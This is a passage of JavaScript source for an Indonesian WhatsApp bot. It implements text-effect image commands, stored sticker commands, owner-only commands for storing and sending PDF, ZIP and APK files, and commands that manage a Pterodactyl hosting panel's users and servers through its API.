if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, text)
ptz.sendMessage(m.chat, { image: { url: haldwhd }, caption: `Done` }, { quoted: m })
}
break
        
        case 'shadow':
case 'write':
case 'romantic':
case 'burnpaper':
case 'smoke':
case 'narutobanner':
case 'love':
case 'undergrass':
case 'doublelove':
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':
{



if (!text) return reply(`Example : ${prefix + command} ${global.botname}`);
    reply("sabar..")
let link;
if (/stonetext/.test(command))
link =
  'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html';
if (/writeart/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html';
if (/summertext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html';
if (/wolfmetaltext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html';
if (/nature3dtext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html';
if (/rosestext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html';
if (/naturetypography/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html';
if (/quotesunder/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html';
if (/shinetext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html';
if (/shadow/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html';
if (/write/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html';
if (/romantic/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html';
if (/burnpaper/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html';
if (/smoke/.test(command))
link =
  'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html';
if (/narutobanner/.test(command))
link =
  'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html';
if (/love/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html';
if (/undergrass/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html';
if (/doublelove/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html';
if (/coffecup/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html';
if (/underwaterocean/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html';
if (/smokyneon/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html';
if (/starstext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html';
if (/rainboweffect/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html';
if (/balloontext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html';
if (/metalliceffect/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html';
if (/embroiderytext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html';
if (/flamingtext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html';
let dehe = await photoOxy(link, text);
ptz.sendMessage(
m.chat,
{ image: { url: dehe }, caption: `Done`},
{ quoted: m }
);
}
break;

    case 'setcmd': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}
break
        
case 'delcmd': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!m.quoted) throw 'Reply Pesan!'
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
m.reply(`Done!`)
}
break

case 'listcmd': {
//if (isBan) return m.reply('*Kamu Telah Terbanned Oleh Owner*')
let teks = `list cmd`
ptz.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break

case 'addpdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama pdf apa')
let teks = `${text}`
{
if (docunye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await ptz.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./database/Docu/${teks}.pdf`)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
}
}
break

case 'delpdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan query')
let teks = `${text}`
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(`./database/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break

case 'listpdf': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
for (let x of docunye) {
teksoooo = `│⭔ ${x}\n`
}
teksoooo = `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf ${botname} + sbuy reply pesan target* \n\n Contoh 2 : yopdf ${botname}`
m.reply(teksoooo)
}
break

case 'yopdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
let teks = `${text}`
{
ptz.sendMessage(m.chat, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break

case 'sendpdf': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
let teks = `${text}`
{
ptz.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}
break

case 'addzip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama zip apa')
let teks = `${text}`
{
if (zipnye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await ptz.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./database/zip/${teks}.zip`)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}
break

case 'delzip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
if (!zipnye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(`./database/zip/${teks}.zip`)
reply(`Sukses delete zip ${teks}`)
}
}
break

case 'listzip': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
for (let x of zipnye) {
teksooooo = `│⭔ ${x}\n`
}
teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip ${botname} + sambil reply pesan target* \n\n Contoh 2 : yozip ${botname}`
m.reply(teksooooo)
}
break

case 'yozip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
ptz.sendMessage(m.chat, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break

case 'sendzip': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
ptz.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}
break

case 'addapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama apk apa')
let teks = `${text}`
{
if (apknye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await ptz.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./database/apk/${teks}.apk`)
fs.writeFileSync('./database/apk.json', JSON.stringify(apknye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}
break

case 'delapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
if (!apknye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(apknye))
fs.unlinkSync(`./database/apk/${teks}.apk`)
reply(`Sukses delete Apk ${teks}`)
}
}
break

case 'listapk': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo = `│⭔ ${x}\n`
}
teksoooooo = `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk ${botname} + sambil reply pesan target* \n\n Contoh 2 : yoapk ${botname}`
m.reply(teksoooooo)
}
break

case 'yoapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
ptz.sendMessage(m.chat, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break

case 'sendapk': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
ptz.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}
break

case 'addvn':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama audionya apa')
if (vnnye.includes(text)) return reply("Nama tersebut sudah di gunakan")
let delb = await ptz.downloadAndSaveMediaMessage(quoted)
vnnye.push(text)
await fsx.copy(delb, `./database/Audio/${text}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break

case 'delvn':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(text)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(text)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${text}.mp3`)
reply(`Sukses delete vn ${text}`)
}
break

case 'listvn':{
//if (isBan) return m.reply('*Kamu Telah Terbanned Oleh Owner*')
 let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `│⭔ ${x}\n`
}
reply(teksooo)
}
break

case 'addmsg': {
if (!isCreator) return m.reply('*Khusus Premium*')
 if (!m.quoted) throw 'Reply Pesan Yang Ingin Disave Di Database'
 if (!text) throw `Example : ${prefix + command} nama file`
 let msgs = global.db.data.database
 if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
 msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break

case 'sendlist': {
if (!isCreator) return m.reply('*Khusus Premium*')
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 ptz.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
 m.reply(`Sukses Mengirim Pesan Ke ${m.quoted.sender}`)
}
break

case 'listmsg': {
//if (isBan) return m.reply('*Kamu Telah Terbanned Oleh Owner*')
 let msgs = global.db.data.database
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
m.reply(teks)
}
break

case 'delmsg': case 'deletemsg': {
if (!isCreator) return m.reply('*Khusus Premium*')
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
m.reply(`Berhasil menghapus '${text}' dari list pesan`)
}
break

case 'getmsg': {
//if (isBan) return m.reply('*Kamu Telah Terbanned Oleh Owner*')
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 ptz.copyNForward(m.chat, msgs[text.toLowerCase()], true)
}
break        
        
        
        
        
        
        
        

        
        
        
        
        
        
        
        //  create panel  1gb - 8
       
    case 'panel': {
             let { generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys")
let t = text.split(',');
if (t.length < 2) return reply(`Example: ${prefix + command} user,nomer

Use: .panel zio,6283257842853`)
let username2 = t[0];
let u2 = t[1];

let sections = [{
title: 'List Disk dan Cpu Panel',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.unli ${username2},${u2}`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.1gb ${username2},${u2}`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.2gb ${username2},${u2}`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.3gb ${username2},${u2}`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.4gb ${username2},${u2}`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.5gb ${username2},${u2}`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.6gb ${username2},${u2}`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.7gb ${username2},${u2}`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.8gb ${username2},${u2}`
}]
}]

let listMessage = {
    title: 'Click For List', 
    sections
};

let msghhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: false, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '1203632675319584@newsletter',
 newsletterName: 'zio', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: `✦ Pilih Ukuran Disk Untuk Server `
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ``
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*${m2}[ Hallo Kak ${pushname} ]${m2}*`,
 subtitle: "Create",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/a12558476b9aa179544a0.jpg" } }, { upload: ptz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await ptz.relayMessage(msghhhhhhh.key.remoteJid, msghhhhhhh.message, {
 messageId: msghhhhhhh.key.id
})}
break
        case 'reinstall': {
if (!isCreator) return reply("Tak nak")
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break
case "detusr": {
if (!isCreator) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)
let usr = args[0]
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
let u = res.attributes
reply(`*${u.username.toUpperCase()} USER DETAILS*

\`\`\`ID: ${u.id}
UUID: ${u.uuid}
USERNAME: ${u.username}
EMAIL: ${u.email}
NAME: ${u.first_name} ${u.last_name}
LANGUAGE: ${u.language}
ADMIN: ${u.root_admin}
CREATED AT: ${u.created_at}\`\`\``)
}
break
case 'updatesrv': {
if (!isCreator) return reply("Tak nak")
let t = text.split(',');
if (t.length < 4) return reply(`*Format salah*

Penggunaan: 
${prefix + command} srvId,locId,memory/disk,cpu`)
let srv = t[0];
let loc = t[1];
let memo_disk = t[2].split`/`;
let cpu = t[3];
let f1 = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json()

let f = await fetch(domain + "/api/application/servers/" + srv + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"allocation": parseInt(loc) || data.attributes.allocation,
"memory": memo_disk[0] || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": memo_disk[1] || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": 5,
"allocations": 5,
"backups": 5
}
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${tanggal2}
UPDATED AT: ${server.updated_at}`)
}
break
case "listsrv": {
  if (!isPremium) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey2
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await ptz.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "listusr": {
  if (!isPremium) return reply("Khusus org spesial")
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await ptz.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "delsrv": {
      if (!isCreator) return reply(`KHUSUS OWN`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case "delusr": {
  if (!isCreator) return reply(`KHUSUS OWNER`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
case "addusr": {
if (!isCreator) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let s = text.split(',')
let email = args[0] + "@gmail.com"
let username = args[0]
let nomor = args[1]

if (!username) return reply(`Ex : ${prefix+command} Username @tag/nomor\n\nContoh :\n${prefix+command} example @user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username @tag/nomor\n\nContoh :\n${prefix+command} example @user`)
let u = m.quoted ? m.quoted.sender : args[1] ? args[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply(`*Format salah!*

Penggunaan:
${prefix + command} username,number/tag`);
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : s[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${username}
┣❏ ➤ *EMAIL* : ${email}
┣❏ ➤ *NAME* : ${username} 
┣❏ ➤ *CREATED AT* :  ${hariini}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`

/*let sections = [{
title: 'Paket Server Panel',
highlight_label: 'Recomended',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,0/0,0`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,1200/1200,50`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,2200/2200,70`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,3200/3200,100`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,4200/4200,125`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,5200/5200,150`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,6200/6200,175`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,7200/7200,175`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.addsrv ${user.first_name},${tanggal2},${user.id},15,1,8200/8200,200`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msghhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By Dgf ziyo Dev', 
 serverMessageId: -1
},
